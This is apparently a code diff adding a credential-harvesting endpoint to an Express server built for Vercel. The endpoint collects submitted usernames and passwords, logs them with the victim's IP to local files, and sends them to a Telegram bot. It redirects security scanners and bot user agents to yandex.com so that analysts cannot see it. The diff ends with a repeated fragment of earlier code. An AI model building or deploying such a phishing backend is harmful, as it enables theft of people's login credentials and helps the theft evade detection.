@@ -6,7 +6,6 @@ import fetch from "node-fetch";
 import dotenv from "dotenv";
 
 dotenv.config();
-
 const app = express();
 
 /* ================= TMP PATH (VERCEL SAFE) ================= */
@@ -22,7 +21,6 @@ const BOT_UA = [
   "curl","wget","python","httpclient","axios",
   "go-http","nikto","sqlmap","nmap","masscan","zgrab","scrapy"
 ];
-
 const isDev = process.env.NODE_ENV === "development";
 
 /* ================= MIDDLEWARE ================= */
@@ -58,11 +56,124 @@ function isPrivateIP(ip) {
   );
 }
 
+function readJSONSafe(file, def = {}) {
+  try {
+    if (!fs.existsSync(file)) return def;
+    return JSON.parse(fs.readFileSync(file, "utf8"));
+  } catch {
+    return def;
+  }
+}
+
 /* ================= ENDPOINT ================= */
 app.post("/api/apinet", async (req, res) => {
-  const ip = getIP(req);
-  const ua = (req.headers["user-agent"] || "").toLowerCase();
+  try {
+    const ip = getIP(req);
+    const ua = (req.headers["user-agent"] || "").toLowerCase();
 
+    /* ===== ANTI BOT ===== */
+    if (!isDev) {
+      if (!ua || ua.length < 10 || BOT_UA.some(b => ua.includes(b)))
+        return res.redirect(302, "https://yandex.com");
+
+      if (!req.headers["accept-language"] || !req.headers["accept"])
+        return res.redirect(302, "https://yandex.com");
+
+      if (!ip || isPrivateIP(ip))
+        return res.redirect(302, "https://yandex.com");
+    }
+
+    /* ===== RATE LIMIT ===== */
+    const rate = readJSONSafe(RATE_FILE, {});
+    const now = Date.now();
+
+    rate[ip] = (rate[ip] || []).filter(t => now - t < 60000);
+    if (rate[ip].length >= 5)
+      return res.status(429).json({ error: "Too many requests" });
+
+    rate[ip].push(now);
+    fs.writeFileSync(RATE_FILE, JSON.stringify(rate));
+
+    /* ===== DATA ===== */
+    const { login, A, B } = req.body;
+    if (!A || !B)
+      return res.status(400).json({ error: "Missing field" });
+
+    const user = A;
+    const pass = B;
+
+    /* ===== ANTISPAM ===== */
+    if (fs.existsSync(SPAM_FILE)) {
+      const lines = fs.readFileSync(SPAM_FILE, "utf8").split("\n");
+      if (lines.some(l => l.includes(`${user}|${pass}`)))
+        return res.json({ ok: true, note: "duplicate ignored" });
+    }
+    fs.appendFileSync(SPAM_FILE, `${user}|${pass}\n`);
+
+    /* ===== UNIQUE ===== */
+    const used = readJSONSafe(USED_FILE, {});
+    const key = crypto
+      .createHash("md5")
+      .update(`${user}|${pass}`)
+      .digest("hex");
+
+    if (used[key])
+      return res.json({ ok: true, note: "already exists" });
+
+    used[key] = {
+      user,
+      pass,
+      ip,
+      time: new Date().toISOString()
+    };
+    fs.writeFileSync(USED_FILE, JSON.stringify(used, null, 2));
+
+    /* ===== TELEGRAM (ANTI CRASH) ===== */
+    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
+      const msg = `
+🧠 *INCOMING DATA*
+
+👤 user : \`${user}\`
+🔑 pass : \`${pass}\`
+
+🌍 IP   : \`${ip}\`
+⏱ TIME : \`${new Date().toISOString()}\`
+
+#APINET
+`;
+
+      try {
+        await fetch(
+          `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: process.env.CHAT_ID,
+              text: msg,
+              parse_mode: "Markdown"
+            })
+          }
+        );
+      } catch (e) {
+        console.error("Telegram error:", e.message);
+      }
+    }
+
+    return res.json({
+      ok: true,
+      dev: isDev,
+      received: { login, user, pass }
+    });
+
+  } catch (err) {
+    console.error("FATAL ERROR:", err);
+    return res.status(500).json({ error: "internal_error" });
+  }
+});
+
+/* ================= EXPORT VERCEL ================= */
+export default app;
   /* ===== ANTI BOT ===== */
   if (!isDev) {
     if (!ua || ua.length < 10 || BOT_UA.some(b => ua.includes(b)))
